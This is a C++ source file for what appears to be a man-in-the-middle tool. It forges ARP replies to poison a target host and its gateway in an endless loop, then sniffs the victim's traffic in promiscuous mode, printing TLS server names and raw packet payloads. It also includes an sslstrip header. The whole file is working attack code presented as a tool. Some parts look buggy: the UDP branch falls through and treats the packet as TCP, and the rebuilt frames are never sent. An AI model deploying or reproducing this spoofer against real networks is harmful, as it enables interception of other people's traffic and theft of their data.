#include "./arpspoof.h"
#include "../sslstrip/sslstrip.h"
#include <unistd.h>

using std::cout;
using std::endl;

EthernetII ArpSpoofer::MakeArpReply(IPv4Address to, IPv4Address from, HWAddress<6> toHw) {
    ARP arp(to, from, toHw, info.hw_addr);
    arp.opcode(ARP::REPLY);                
    cout<< arp.target_hw_addr().to_string()<<endl;
    
    return EthernetII(toHw, info.hw_addr) / arp;    
}

ArpSpoofer::ArpSpoofer(IPv4Address target, IPv4Address my, IPv4Address gw, std::string device) : targetIp(target), myIp(my), gwIp(gw),  device(device) {
                            PacketSender sender;                                
                            this->iface =  NetworkInterface(device);                        
                            this->info = this->iface.addresses(); 
                            this->gwHwAddr = Utils::resolve_hwaddr(iface,gwIp,sender);
                            this->targetHwAddr = Utils::resolve_hwaddr(iface,targetIp,sender);                            
                            this->toGw = MakeArpReply(gw,target,gwHwAddr);                            
                            this->toTarget = MakeArpReply(target, gw, targetHwAddr);                                                                            
}

void ArpSpoofer::doArpspoof() {
    static long long unsigned int i=1;
    cout<<"=====do arp====="<<endl;
    cout<<toGw.dst_addr().to_string()<<endl;      
    cout<<toGw.rfind_pdu<ARP>().target_ip_addr().to_string()<<endl;
    cout<<toGw.rfind_pdu<ARP>().target_hw_addr().to_string()<<endl;
    cout<<"=====do arp====="<<endl;
    cout<<toTarget.dst_addr().to_string()<<endl;      
    cout<<toTarget.rfind_pdu<ARP>().target_ip_addr().to_string()<<endl;
    cout<<toTarget.rfind_pdu<ARP>().target_hw_addr().to_string()<<endl;
    while(true) {        
        PacketSender arpSender;          
        arpSender.send(toGw,iface);        
        arpSender.send(toTarget,iface);            
    }
}
    
void ArpSpoofer::ipForward(IPv4Address to, IPv4Address from, HWAddress<6> toHw,
    HWAddress<6> from_hw, std::string device, IPv4Address myIp) {
        SnifferConfiguration config;
        config.set_filter("ip src "+ from.to_string());
        config.set_promisc_mode(true);
        config.set_immediate_mode(true);        
        NetworkInterface::Info info(NetworkInterface(device).addresses());

        Sniffer sniffer(device,config);
        sniffer.sniff_loop([=](PDU& pdu) {
            PDU* newPdu;
            EthernetII newEth;
            TCP tmp;
            byte_array b;
            
            cout << "catched " + from.to_string() << endl;
            
            switch (pdu.rfind_pdu<IP>().inner_pdu()->pdu_type())
            {
                case PDU::PDUType::TCP :{
                    cout << "TCP" << endl;                    
                    tmp=pdu.rfind_pdu<TCP>();
                    b=tmp.serialize();
                    TLS tls(b);
                    newEth = EthernetII(toHw,info.hw_addr)/IP(to,myIp)/tmp;   
                    cout<<tls.servername()<<endl;                                     
                    break;
                }
                
                case PDU::PDUType::UDP :{
                    cout << "UDP" << endl;
                    newEth = EthernetII(toHw,info.hw_addr)/IP(to,myIp)/pdu.rfind_pdu<TCP>();
                }
                
                default:{
                    cout << "NOT DECLEARED" << endl;
                    auto dump =pdu.rfind_pdu<IP>().inner_pdu()->serialize();
                    cout<<std::string(dump.begin(),dump.end())<<endl;
                    newEth = EthernetII(toHw,info.hw_addr)/IP(to,myIp)/pdu.rfind_pdu<RawPDU>();
                    break;
                }
            }
            return true;
        });
}